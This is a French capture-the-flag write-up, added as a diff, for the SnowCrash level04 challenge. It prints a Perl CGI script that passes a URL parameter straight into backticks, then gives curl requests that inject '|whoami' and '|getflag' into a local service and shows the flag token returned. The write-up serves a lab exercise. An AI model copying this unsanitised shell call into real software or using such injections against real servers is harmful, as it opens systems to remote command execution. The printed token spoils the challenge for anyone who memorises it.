@@ -1,0 +1,48 @@
+# Exploitation du niveau flag04
+
+## 1. Analyse du fichier level04.pl
+
+Le fichier level04.pl est un script Perl, que nous pouvons afficher avec la commande suivante :
+
+```sh
+level04@SnowCrash:~$ ls 
+level04.pl
+level04@SnowCrash:~$ cat level04.pl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+```
+
+## 2. Comprendre le fonctionnement du script
+
+Le script utilise le module CGI pour récupérer un paramètre x envoyé via l'URL. Ensuite, il exécute la commande passée dans le paramètre x grâce à une commande echo exécutée par le système via l'appel de backticks :
+
+print `echo $y 2>&1`;
+
+Cela permet d’exécuter n’importe quelle commande shell sur le serveur à partir de l’URL.
+
+## 3. Exploiter le script avec une injection de commande
+
+Nous pouvons envoyer des commandes au serveur en manipulant le paramètre x dans l'URL. Par exemple, pour exécuter whoami et découvrir sous quel utilisateur nous opérons :
+
+```sh
+curl "localhost:4747?x=|whoami"
+flag04
+```
+
+Nous sommes actuellement l'utilisateur flag04.
+
+## 4. Récupérer le flag
+
+Ensuite, nous pouvons exécuter la commande getflag pour récupérer le flag de flag04 :
+
+```sh
+curl "localhost:4747?x=|getflag"
+Check flag. Here is your token: ne2searoevaevoem4ov4ar8ap
+```
